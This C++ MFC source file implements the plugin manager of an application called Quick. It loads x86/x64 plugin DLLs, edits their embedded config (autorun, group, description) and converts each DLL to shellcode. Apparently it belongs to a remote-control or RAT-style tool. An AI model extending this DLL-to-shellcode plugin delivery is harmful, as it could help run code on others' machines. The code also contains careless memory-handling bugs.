// ServiceDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Quick.h"
#include "MainFrm.h"
#include "QuickView.h"
#include "PlugView.h"



#ifdef _DEBUG
#define new DEBUG_NEW
#endif

/////////////////////////////////////////////////////////////////////////////
// CPlugView dialog

CPlugView* g_pCPlugView = NULL;

typedef struct
{
	TCHAR* title;
	int		nWidth;
	bool   autosize;
}CPlugOLUMNSTRUCT;

CPlugOLUMNSTRUCT g_Plug_Data[] =
{
	{_T("路径x86   拖拽文件添加"),	    50, true	},
	{_T("路径x64   拖拽文件添加"),	    50, true	},
	{_T("运行"),		40	, false},   //自动还是手动
	{_T("文件名"),		215	, false},
	{_T("大小 X86"),	70	, false},
	{_T("大小 X64"),	70	, false},
	{_T("说明"),		310	, false},
	{_T("分组"),		40	, false},
	{_T("类型"),		40	, false},
};


/////////////////////////////////////////////////////////////////////////////
// CPlugView

IMPLEMENT_DYNCREATE(CPlugView, CListView)

CPlugView::CPlugView()
{
	ViewUpdate = FALSE;
	g_pCPlugView = this;
	g_Log_Width = 0;
	g_Log_Count = (sizeof(g_Plug_Data) / sizeof(CPlugOLUMNSTRUCT));
}

CPlugView::~CPlugView()
{
}


BEGIN_MESSAGE_MAP(CPlugView, CListView)
	//{{AFX_MSG_MAP(CPlugView)
	ON_WM_SIZE()
	ON_WM_DROPFILES()
	ON_NOTIFY_REFLECT(NM_RCLICK, OnRclick)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPlugView drawing

void CPlugView::OnDraw(CDC* pDC)
{
	CDocument* pDoc = GetDocument();
	// TODO: add draw code here
}

/////////////////////////////////////////////////////////////////////////////
// CPlugView diagnostics

#ifdef _DEBUG
void CPlugView::AssertValid() const
{
	CListView::AssertValid();
}

void CPlugView::Dump(CDumpContext& dc) const
{
	CListView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CPlugView message handlers

void CPlugView::OnInitialUpdate()
{
	CListView::OnInitialUpdate();
	m_pPlugList = &GetListCtrl();
	m_pPlugList->SetRedraw(FALSE);
	m_pPlugList->SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_ONECLICKACTIVATE | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES);
	if (m_pPlugList->GetHeaderCtrl()->GetItemCount() == 0)
	{
		for (int i = 0; i < g_Log_Count; i++)
		{
			m_pPlugList->InsertColumn(i, g_Plug_Data[i].title);
			g_Log_Width += g_Plug_Data[i].nWidth; // 总宽度
		}
		ReadPortInfo();
	}
	DragAcceptFiles(TRUE);
	ViewUpdate = TRUE;

	HWND hWndHeader = m_pPlugList->GetDlgItem(0)->GetSafeHwnd();
	m_pPlugList->SetRedraw(TRUE);

	//主要调用OnSize函数
	CRect rect;
	this->GetWindowRect(rect);
	ScreenToClient(rect);
	this->OnSize(SIZE_RESTORED, rect.Width(), rect.Height());
}

BOOL CPlugView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: Add your specialized code here and/or call the base class
	cs.style |= LVS_REPORT;
	return CListView::PreCreateWindow(cs);
}

void CPlugView::OnSize(UINT nType, int cx, int cy)
{
	CListView::OnSize(nType, cx, cy);

	if (ViewUpdate)
	{
		m_pPlugList->SetRedraw(FALSE);
		double dcx = cx - 5;    	
		for (int i = 2; i < g_Log_Count; i++)
		{
			dcx -= g_Plug_Data[i].nWidth;
		}
		m_pPlugList->SetColumnWidth(0, (int)dcx / 2);
		m_pPlugList->SetColumnWidth(1, (int)dcx / 2);
		for (int i = 2; i < g_Log_Count; i++)
		{
			m_pPlugList->SetColumnWidth(i, g_Plug_Data[i].nWidth);
		}
		m_pPlugList->SetRedraw(TRUE);
	}

}



void CPlugView::OnRclick(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("&(D)删除选择"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	menu.AppendMenu(MF_STRING | MF_ENABLED, 101, _T("&(A)全部删除"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	menu.AppendMenu(MF_STRING | MF_ENABLED, 102, _T("&(E)刷新数据"));
	menu.AppendMenu(MF_SEPARATOR, NULL);
	menu.AppendMenu(MF_STRING | MF_ENABLED, 103, _T("&(C)属性修改"));

	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = menu.TrackPopupMenu(TPM_RETURNCMD | TPM_LEFTALIGN | TPM_RIGHTBUTTON, p.x, p.y, this, NULL);
	menu.DestroyMenu();
	if (!nMenuResult) 	return;

	switch (nMenuResult)
	{
	case 100:
	{
		TKYLockRW_CLockW w(mLockRM);
		POSITION pos = m_pPlugList->GetFirstSelectedItemPosition();
		while (pos)
		{
			int nItem = m_pPlugList->GetNextSelectedItem(pos);
			CString Filename = m_pPlugList->GetItemText(nItem, 1);
			PluginsDate::iterator 	it = m_PlugsDatex86.find(Filename);
			if (it != m_PlugsDatex86.end())
			{
				SAFE_DELETE_AR(it->second->filedate);
				SAFE_DELETE(it->second);
				m_PlugsDatex86.erase(it);
			}
			it = m_PlugsDatex64.find(Filename);
			if (it != m_PlugsDatex64.end())
			{
				SAFE_DELETE_AR(it->second->filedate);
				SAFE_DELETE(it->second);
				m_PlugsDatex64.erase(it);
			}
			m_pPlugList->DeleteItem(nItem);
			pos = m_pPlugList->GetFirstSelectedItemPosition();
		}
		WritePortInfo();
	}
	break;
	case 101:
	{
		TKYLockRW_CLockW w(mLockRM);
		m_pPlugList->DeleteAllItems();

		PluginsDate::iterator it_oneofserver = m_PlugsDatex86.begin();
		while (it_oneofserver != m_PlugsDatex86.end())
		{
			SAFE_DELETE_AR(it_oneofserver->second->filedate);
			SAFE_DELETE(it_oneofserver->second);
			m_PlugsDatex86.erase(it_oneofserver++);

		}
		it_oneofserver = m_PlugsDatex64.begin();
		while (it_oneofserver != m_PlugsDatex64.end())
		{
			SAFE_DELETE_AR(it_oneofserver->second->filedate);
			SAFE_DELETE(it_oneofserver->second);
			m_PlugsDatex64.erase(it_oneofserver++);

		}
		WritePortInfo();
	}
	break;
	case 102:
	{
		m_pPlugList->DeleteAllItems();
		mLockRM.LockWrite();
		PluginsDate::iterator it_oneofserver = m_PlugsDatex86.begin();
		while (it_oneofserver != m_PlugsDatex86.end())
		{
			SAFE_DELETE_AR(it_oneofserver->second->filedate);
			SAFE_DELETE(it_oneofserver->second);
			m_PlugsDatex86.erase(it_oneofserver++);

		}
		it_oneofserver = m_PlugsDatex64.begin();
		while (it_oneofserver != m_PlugsDatex64.end())
		{
			SAFE_DELETE_AR(it_oneofserver->second->filedate);
			SAFE_DELETE(it_oneofserver->second);
			m_PlugsDatex64.erase(it_oneofserver++);

		}
		mLockRM.UnlockWrite();
		ReadPortInfo();
	}
	break;
	case 103:
	{
		POSITION pos = m_pPlugList->GetFirstSelectedItemPosition();
		int nItem = m_pPlugList->GetNextSelectedItem(pos);
		CString FilePath0 = m_pPlugList->GetItemText(nItem, 0);
		CString FilePath1 = m_pPlugList->GetItemText(nItem, 1);


		CPlugChangeDlg	dlg;
		dlg.Init(FilePath0, FilePath1);
		if (dlg.DoModal() != IDOK)
		{
			return;
		}

		//重新加载
		m_pPlugList->DeleteAllItems();
		mLockRM.LockWrite();
		PluginsDate::iterator it_oneofserver = m_PlugsDatex86.begin();
		while (it_oneofserver != m_PlugsDatex86.end())
		{
			SAFE_DELETE_AR(it_oneofserver->second->filedate);
			SAFE_DELETE(it_oneofserver->second);
			m_PlugsDatex86.erase(it_oneofserver++);

		}
		it_oneofserver = m_PlugsDatex64.begin();
		while (it_oneofserver != m_PlugsDatex64.end())
		{
			SAFE_DELETE_AR(it_oneofserver->second->filedate);
			SAFE_DELETE(it_oneofserver->second);
			m_PlugsDatex64.erase(it_oneofserver++);

		}
		mLockRM.UnlockWrite();
		ReadPortInfo();
	}
	break;
	}

	*pResult = 0;
}




void CPlugView::OnDropFiles(HDROP hDropInfo)
{
	UINT count;
	TCHAR filePath[MAX_PATH] = { 0 };
	count = DragQueryFile(hDropInfo, -1, NULL, 0);
	if (1 == count)
	{
		DragQueryFile(hDropInfo, 0, filePath, sizeof(filePath) * 2 + 2);
		if (AddFileData(filePath))
			WritePortInfo();
		UpdateData(FALSE);
		
	}
	else
	{
		for (UINT i = 0; i < count; i++)
		{
			int pahtLen = DragQueryFile(hDropInfo, i, filePath, sizeof(filePath) * 2 + 2);
			if (AddFileData(filePath))
				WritePortInfo();
		}
	
	}
	DragFinish(hDropInfo); 
	CListView::OnDropFiles(hDropInfo);
}

bool CPlugView::AddFileData(TCHAR* cstrFilePath)
{
	TKYLockRW_CLockW w(mLockRM);
	HANDLE hFile = CreateFile(cstrFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		SetWindowText(_T("添加失败"));
		return false;
	}
	int m_FileSzie = GetFileSize(hFile, NULL);
	BYTE* bfileDate = new BYTE[m_FileSzie];
	ZeroMemory(bfileDate, sizeof(bfileDate));
	DWORD dwReadsA;
	ReadFile(hFile, bfileDate, m_FileSzie, &dwReadsA, NULL);
	CloseHandle(hFile);

	DWORD dwOffset = -1;
	dwOffset = memfind((char*)bfileDate, "getinfo", m_FileSzie, 0);
	if (dwOffset == -1)			 //处理普通插件 属于只加载
	{
		return FALSE;
	}

	DLLInfo mPlugInfo;
	memcpy(&mPlugInfo, bfileDate + dwOffset, sizeof(DLLInfo));
	strcat_s(mPlugInfo.mark, "_mark");
	memcpy(bfileDate + dwOffset, &mPlugInfo, sizeof(DLLInfo));

	CString filepath = cstrFilePath;
	CString filename = filepath.Right(filepath.GetLength() - filepath.ReverseFind(_T('\\')) - 1);

	PluginsInfo* p_PluginsInfo = new PluginsInfo;
	p_PluginsInfo->filedate = bfileDate;
	p_PluginsInfo->filesize = m_FileSzie;
	string s_tmp = MD5((void*)bfileDate, m_FileSzie).toString();
	int size = MultiByteToWideChar(CP_ACP, 0, s_tmp.c_str(), -1, NULL, 0);
	MultiByteToWideChar(CP_ACP, 0, s_tmp.c_str(), -1, p_PluginsInfo->Version, size);
	p_PluginsInfo->bauto = mPlugInfo.isautorun ? TRUE : FALSE;


	PluginsDate* m_PlugsDate = NULL;
	if (mPlugInfo.isx86)
		m_PlugsDate = &m_PlugsDatex86;
	else
		m_PlugsDate = &m_PlugsDatex64;

	PluginsDate::iterator 	it = m_PlugsDate->find(filename);   //查找是否加载
	if (it != m_PlugsDate->end())
	{
		SAFE_DELETE_AR(it->second->filedate);
		SAFE_DELETE(it->second);
		it->second = p_PluginsInfo;
	}
	else
	{
		m_PlugsDate->insert(MAKE_PAIR(PluginsDate, filename, p_PluginsInfo));
	}

	//生成shellcode 并且加入
	CString	filename_bin = filename + _T("_bin");
	PluginsInfo* p_PluginsInfo_bin = new PluginsInfo;
	int m_FileSzie_bin = 0;
	byte* bfileDate_bin = NULL;
	bfileDate_bin = dll_to_shellcode(bfileDate, m_FileSzie, &m_FileSzie_bin);
	if (bfileDate_bin == NULL)
	{
		log_严重("扩展插件生成shellcode失败");
		return false;
	}
	p_PluginsInfo_bin->filedate = bfileDate_bin;
	p_PluginsInfo_bin->filesize = m_FileSzie_bin;
	string s_tmp_bin = MD5((void*)bfileDate_bin, m_FileSzie_bin).toString();
	size = MultiByteToWideChar(CP_ACP, 0, s_tmp_bin.c_str(), -1, NULL, 0);
	MultiByteToWideChar(CP_ACP, 0, s_tmp_bin.c_str(), -1, p_PluginsInfo_bin->Version, size);
	p_PluginsInfo_bin->bauto = mPlugInfo.isautorun ? TRUE : FALSE;
	it = m_PlugsDate->find(filename_bin);   //查找是否加载
	if (it != m_PlugsDate->end())
	{
		SAFE_DELETE_AR(it->second->filedate);
		SAFE_DELETE(it->second);
		it->second = p_PluginsInfo_bin;
	}
	else
	{
		m_PlugsDate->insert(MAKE_PAIR(PluginsDate, filename_bin, p_PluginsInfo_bin));
	}






	int counts = m_pPlugList->GetItemCount();
	for (int i = 0; i < counts; i++)
	{
		CString itemtetx = m_pPlugList->GetItemText(i, 3);
		if (itemtetx.Compare(filename) == 0)
		{
			if (mPlugInfo.isx86)
				m_pPlugList->SetItemText(i, 0, cstrFilePath);
			else
				m_pPlugList->SetItemText(i, 1, cstrFilePath);

			if (mPlugInfo.isautorun)
				m_pPlugList->SetItemText(i, 2, _T("自动"));
			else
				m_pPlugList->SetItemText(i, 2, _T("手动"));

			m_pPlugList->SetItemText(i, 3, filename);


			filename.Format(_T("%d "), m_FileSzie);
			if (mPlugInfo.isx86)
				m_pPlugList->SetItemText(i, 4, filename);
			else
				m_pPlugList->SetItemText(i, 5, filename);

			m_pPlugList->SetItemText(i, 6, mPlugInfo.dlltext);
			m_pPlugList->SetItemText(i, 7, mPlugInfo.Group);
			m_pPlugList->SetItemText(i, 8, mPlugInfo.bmutual ? _T("交互") : _T("普通"));
			return true;
		}
	}

	if (mPlugInfo.isx86)
		m_pPlugList->InsertItem(0, cstrFilePath);
	else
	{
		m_pPlugList->InsertItem(0, _T(""));
		m_pPlugList->SetItemText(0, 1, cstrFilePath);
	}


	if (mPlugInfo.isautorun)
		m_pPlugList->SetItemText(0, 2, _T("自动"));
	else
		m_pPlugList->SetItemText(0, 2, _T("手动"));

	m_pPlugList->SetItemText(0, 3, filename);

	filename.Format(_T("%d "), m_FileSzie);

	if (mPlugInfo.isx86)
		m_pPlugList->SetItemText(0, 4, filename);
	else
		m_pPlugList->SetItemText(0, 5, filename);

	m_pPlugList->SetItemText(0, 6, mPlugInfo.dlltext);
	m_pPlugList->SetItemText(0, 7, mPlugInfo.Group);
	m_pPlugList->SetItemText(0, 8, mPlugInfo.bmutual ? _T("交互") : _T("普通"));
	return true;

}



void CPlugView::WritePortInfo()
{
	HKEY hKey;
	TCHAR ExePath[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, ExePath, sizeof(ExePath));
	::PathStripPath(ExePath);
	CString	name = ExePath;
	name.Replace(_T(".exe"), _T(" "));
	::RegOpenKeyEx(HKEY_CURRENT_USER, name.GetBuffer(), 0, KEY_SET_VALUE, &hKey);
	::RegDeleteValue(hKey, _T("IpPlugsDate"));
	::RegCloseKey(hKey);

	BYTE* B_portinfo = new BYTE[65535];
	int allnum = 0;
	int m_listnum = m_pPlugList->GetItemCount();
	if (m_listnum <= 0) return;

	int sitr = sizeof(int);

	for (int i = 0; i < m_listnum; i++)
	{
		CString	str = m_pPlugList->GetItemText(i, 0);
		if (str.Compare(_T("")) == 0)
		{
			continue;
		}
		allnum++;
		memcpy(B_portinfo + sitr, str.GetBuffer(), str.GetLength() * sizeof(TCHAR) + 2);
		sitr += str.GetLength() * sizeof(TCHAR) + 2;

		if (sitr >= 65535)
		{
			this->SetWindowText(_T("配置太多无法保存"));
			return;
		}
	}
	for (int i = 0; i < m_listnum; i++)
	{
		CString str = m_pPlugList->GetItemText(i, 1);
		if (str.Compare(_T("")) == 0)
		{
			continue;
		}
		allnum++;
		memcpy(B_portinfo + sitr, str.GetBuffer(), str.GetLength() * sizeof(TCHAR) + 2);
		sitr += str.GetLength() * sizeof(TCHAR) + 2;
		if (sitr >= 65535)
		{
			this->SetWindowText(_T("配置太多无法保存"));
			return;
		}
	}
	memcpy(B_portinfo, &allnum, sizeof(int));

	if (ERROR_SUCCESS == ::RegCreateKey(HKEY_CURRENT_USER, name.GetBuffer(), &hKey))
	{
		if (ERROR_SUCCESS != ::RegSetValueEx(hKey, _T("IpPlugsDate"), 0, REG_BINARY, (unsigned char*)B_portinfo, sitr))
		{
			this->SetWindowText(_T("写入配置错误"));
			::RegCloseKey(hKey);
			return;
		}
	}

	::RegCloseKey(hKey);
	UpdateData(false);
	SAFE_DELETE_AR(B_portinfo);

}

void CPlugView::readfile(CString FileName)
{
	CFileFind fFinder;
	BOOL bFind = fFinder.FindFile(FileName);
	if (!bFind)
	{
		log_警告("OtherPlugins插件目录不存在.");
		return;
	}
	while (bFind)
	{
		bFind = fFinder.FindNextFile();
		//当前文件夹及上层文件夹(名称分别为..)-----------------
		if (fFinder.IsDots()) continue;
		//子文件夹---------------------------------------------
		if (fFinder.IsDirectory())
		{
			CString cstrDirName = fFinder.GetFileName();  //directory name
			CString cstrDirPath = fFinder.GetFilePath();  //directory path
			continue;
		}
		//文件-------------------------------------------------
		CString cstrFileName = fFinder.GetFileName();   //file name
		CString cstrFilePath = fFinder.GetFilePath();   //file path
		//读取加入到容器额
		AddFileData(cstrFilePath.GetBuffer());
	}
	fFinder.Close();
}




void CPlugView::ReadPortInfo()
{
	TCHAR strSelf[MAX_PATH];
	GetModuleFileName(NULL, strSelf, sizeof(strSelf) * sizeof(TCHAR));
	CString str_path = strSelf;
	str_path = str_path.Mid(0, str_path.ReverseFind('\\'));
	CString str_plusgpath;

	str_plusgpath = str_path + _T("\\OtherPlugins");
	CString str_plusgpathx86, str_plusgpathx64;
	str_plusgpathx86 = str_plusgpath + _T("\\x86\\*.*");
	str_plusgpathx64 = str_plusgpath + _T("\\x64\\*.*");
	readfile(str_plusgpathx86);
	readfile(str_plusgpathx64);

	//读取配置
	BYTE* B_portinfo = new BYTE[65535];
	TCHAR* FilePath;
	HKEY hKEY;
	if (ERROR_SUCCESS == ::RegOpenKeyEx(HKEY_CURRENT_USER, ((CQuickApp*)AfxGetApp())->g_Exename.GetBuffer(), 0, KEY_READ, &hKEY))
	{
		DWORD dwSize = 65535;
		DWORD dwType = REG_BINARY;
		if (::RegQueryValueEx(hKEY, _T("IpPlugsDate"), 0, &dwType, (LPBYTE)B_portinfo, &dwSize) == ERROR_SUCCESS)
		{
			int m_num, site;
			site = sizeof(int);
			memcpy(&m_num, B_portinfo, site);
			if (m_num > 0)
			{
				for (int i = 0; i < m_num; i++)
				{
					FilePath = (TCHAR*)(B_portinfo + site);
					AddFileData(FilePath);
					site += lstrlen(FilePath) * 2 + 2;
				}

			}
		}
	}
	::RegCloseKey(hKEY);
	SAFE_DELETE_AR(B_portinfo);
}

int CPlugView::memfind(const char* mem, const char* str, int sizem, int sizes)
{
	int   da, i, j;
	if (sizes == 0) da = strlen(str);
	else da = sizes;
	for (i = 0; i < sizem; i++)
	{
		for (j = 0; j < da; j++)
			if (mem[i + j] != str[j])	break;
		if (j == da)
			return i;
	}
	return -1;
}

























// CPlugChangeDlg.cpp: 实现文件
//


// CPlugChangeDlg 对话框

IMPLEMENT_DYNAMIC(CPlugChangeDlg, CDialog)

CPlugChangeDlg::CPlugChangeDlg(CWnd* pParent /*=nullptr*/)
	: CDialog(IDD_PLUGCHANGE, pParent)

	, mgroup(_T(""))
	, mname(_T(""))
	, mtext(_T(""))
{

}

CPlugChangeDlg::~CPlugChangeDlg()
{
}

void CPlugChangeDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);

	DDX_Text(pDX, IDC_EDIT_GROUP, mgroup);
	DDX_Text(pDX, IDC_EDIT_NAME, mname);
	DDX_Text(pDX, IDC_EDIT_TEXT, mtext);
}


BEGIN_MESSAGE_MAP(CPlugChangeDlg, CDialog)

END_MESSAGE_MAP()


// CPlugChangeDlg 消息处理程序


BOOL CPlugChangeDlg::Init(CString FilePath0, CString FilePath1)
{
	mFilePath0 = FilePath0;
	mFilePath1 = FilePath1;
	dwOffset = -1;
	return TRUE;
}

BOOL CPlugChangeDlg::OnInitDialog()
{
	HANDLE hFile = CreateFile(mFilePath0, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		SetWindowText(_T("文件打开失败"));
		return false;
	}
	int m_FileSzie = GetFileSize(hFile, NULL);
	char* bfileDate = new char[m_FileSzie];
	ZeroMemory(bfileDate, sizeof(bfileDate));
	DWORD dwReadsA;
	ReadFile(hFile, bfileDate, m_FileSzie, &dwReadsA, NULL);
	CloseHandle(hFile);


	dwOffset = memfind(bfileDate, "getinfo", m_FileSzie, 0);
	if (dwOffset == -1)
	{
		SetWindowText(_T("无法修改配置信息"));
		return CDialog::OnInitDialog();

	}//无法修改配置信息就退出

	memcpy(&mPlugInfo, bfileDate + dwOffset, sizeof(DLLInfo));
	if (mPlugInfo.isautorun)
	{
		((CButton*)GetDlgItem(IDC_CHECK_AUTO))->SetCheck(TRUE);
	}

	mgroup = mPlugInfo.Group;
	mname = mPlugInfo.dllname;
	mtext = mPlugInfo.dlltext;


	UpdateData(FALSE);

	return CDialog::OnInitDialog();
}

int CPlugChangeDlg::memfind(const char* mem, const char* str, int sizem, int sizes)
{
	int   da, i, j;
	if (sizes == 0) da = strlen(str);
	else da = sizes;
	for (i = 0; i < sizem; i++)
	{
		for (j = 0; j < da; j++)
			if (mem[i + j] != str[j])	break;
		if (j == da)
			return i;
	}
	return -1;
}

/////////////////
// User pressed OK: check for empty string if required flag is set.
//
void CPlugChangeDlg::OnOK()
{
	UpdateData(TRUE);

	if (((CButton*)GetDlgItem(IDC_CHECK_X86))->GetCheck() == TRUE)
	{
		HANDLE hFile = CreateFile(mFilePath0, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			SetWindowText(_T("文件打开失败"));
			return;
		}
		int m_FileSzie = GetFileSize(hFile, NULL);
		char* bfileDate = new char[m_FileSzie];
		ZeroMemory(bfileDate, sizeof(bfileDate));
		DWORD dwReadsA;
		ReadFile(hFile, bfileDate, m_FileSzie, &dwReadsA, NULL);
		CloseHandle(hFile);


		dwOffset = memfind(bfileDate, "getinfo", m_FileSzie, 0);
		if (dwOffset == -1)
		{
			SetWindowText(_T("无法修改配置信息"));
			SAFE_DELETE_AR(bfileDate);
			return;

		}//无法修改配置信息就退出
		DeleteFile(mFilePath0);


		CFile file;
		if (file.Open(mFilePath0, CFile::modeCreate | CFile::modeWrite | CFile::modeRead | CFile::typeBinary))
		{

			mPlugInfo.isx86 = TRUE;
			if (((CButton*)GetDlgItem(IDC_CHECK_AUTO))->GetCheck() == TRUE)
				mPlugInfo.isautorun = TRUE;
			else
				mPlugInfo.isautorun = FALSE;
			memcpy(mPlugInfo.Group, mgroup.GetBuffer(), mgroup.GetLength() * 2 + 2);
			memcpy(mPlugInfo.dllname, mname.GetBuffer(), mname.GetLength() * 2 + 2);
			memcpy(mPlugInfo.dlltext, mtext.GetBuffer(), mtext.GetLength() * 2 + 2);

			memcpy(bfileDate + dwOffset, (char*)&mPlugInfo, sizeof(DLLInfo));
			file.Write(bfileDate, m_FileSzie);
			file.Close();
			SAFE_DELETE_AR(bfileDate);
		}
		else
		{
			SetWindowText(_T("被修改X86文件删除，但是新文件生成失败"));
			SAFE_DELETE_AR(bfileDate);
			return;
		}

	}

	if (((CButton*)GetDlgItem(IDC_CHECK_X64))->GetCheck() == TRUE)
	{
		HANDLE hFile = CreateFile(mFilePath1, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			SetWindowText(_T("文件打开失败"));
			return;
		}
		int m_FileSzie = GetFileSize(hFile, NULL);
		char* bfileDate = new char[m_FileSzie];
		ZeroMemory(bfileDate, sizeof(bfileDate));
		DWORD dwReadsA;
		ReadFile(hFile, bfileDate, m_FileSzie, &dwReadsA, NULL);
		CloseHandle(hFile);


		dwOffset = memfind(bfileDate, "getinfo", m_FileSzie, 0);
		if (dwOffset == -1)
		{
			SetWindowText(_T("无法修改配置信息"));
			SAFE_DELETE_AR(bfileDate);
			return;

		}//无法修改配置信息就退出
		DeleteFile(mFilePath1);


		CFile file;
		if (file.Open(mFilePath1, CFile::modeCreate | CFile::modeWrite | CFile::modeRead | CFile::typeBinary))
		{
			mPlugInfo.isx86 = FALSE;
			if (((CButton*)GetDlgItem(IDC_CHECK_AUTO))->GetCheck() == TRUE)
				mPlugInfo.isautorun = TRUE;
			memcpy(mPlugInfo.Group, mgroup.GetBuffer(), mgroup.GetLength() * 2 + 2);
			memcpy(mPlugInfo.dllname, mname.GetBuffer(), mname.GetLength() * 2 + 2);
			memcpy(mPlugInfo.dlltext, mtext.GetBuffer(), mtext.GetLength() * 2 + 2);

			memcpy(bfileDate + dwOffset, (char*)&mPlugInfo, sizeof(DLLInfo));
			file.Write(bfileDate, m_FileSzie);
			file.Close();
			SAFE_DELETE_AR(bfileDate);
		}
		else
		{
			SetWindowText(_T("被修改X64文件删除，但是新文件生成失败"));
			SAFE_DELETE_AR(bfileDate);
			return;
		}

	}


	CDialog::OnOK();
}


